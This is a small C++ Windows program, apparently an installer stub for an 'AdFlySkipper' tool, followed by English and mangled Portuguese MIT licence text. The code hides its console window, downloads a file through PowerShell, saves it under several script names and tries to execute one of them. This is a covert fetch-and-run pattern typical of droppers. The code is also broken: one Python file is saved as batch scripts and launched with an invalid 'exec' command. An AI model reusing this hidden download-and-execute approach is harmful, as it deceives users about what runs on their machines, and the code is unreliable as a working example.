#include <iostream>
#include <windows.h>

using namespace std;

int main () {
        FreeConsole();
        system("mkdir %userprofile%\\Desktop\\AdFlySkipperZip");
        system("PowerShell -Command Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile c:\\Users\\$env:UserName\\Desktop\\AdFlySkipperZip\\main.py");
        system("PowerShell -Command Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile c:\\Users\\$env:UserName\\Desktop\\AdFlySkipperZip\\install.cmd");
        system("PowerShell -Command Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile c:\\Users\\$env:UserName\\Desktop\\AdFlySkipperZip\\start_adfs.cmd");
        system("exec %userprofile%\\Desktop\\AdFlySkipperZip\\install.cmd");
        return 0;
}



/*

        MIT License

        Copyright (c) 2022 Yuri Rocha Ferreira

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.

*/

/*

        MIT License 

        Copyright (c) 2022 Yuri Rocha Ferreira 

        A permiss??o ?? concedida, gratuitamente, a qualquer pessoa que obtenha uma c??pia 
        deste software e dos arquivos de documenta????o associados (o "Software"), para lidar 
        com o Software sem restri????es, incluindo sem limita????o os direitos 
        de usar, copiar, modificar, mesclar, publicar, distribuir, sublicenciar e/ou vender 
        c??pias do Software e permitir que as pessoas a quem o Software ?? 
        fornecido o fa??am, sujeito ??s seguintes condi????es:

        Aviso de direitos autorais e este aviso de permiss??o devem ser inclu??dos em todas as 
        c??pias ou partes substanciais do Software. 

        O SOFTWARE ?? FORNECIDO "COMO EST??", SEM GARANTIA DE QUALQUER TIPO, EXPRESSA OU
        IMPL??CITA, INCLUINDO, MAS N??O SE LIMITANDO ??S GARANTIAS DE COMERCIALIZA????O, 
        ADEQUA????O A UM DETERMINADO FIM E N??O VIOLA????O. EM NENHUMA CIRCUNST??NCIA OS 
        AUTORES OU DETENTORES DE DIREITOS AUTORAIS SER??O RESPONS??VEIS POR QUALQUER REIVINDICA????O, DANOS OU OUTRA 
        RESPONSABILIDADE, SEJA EM UMA A????O DE CONTRATO, ATO IL??CITO OU DE OUTRA FORMA, DECORRENTE DE, 
        DE OU EM CONEX??O COM O SOFTWARE OU O USO OU OUTRAS NEGOCIA????ES NO 
        PROGRAMAS.

*/
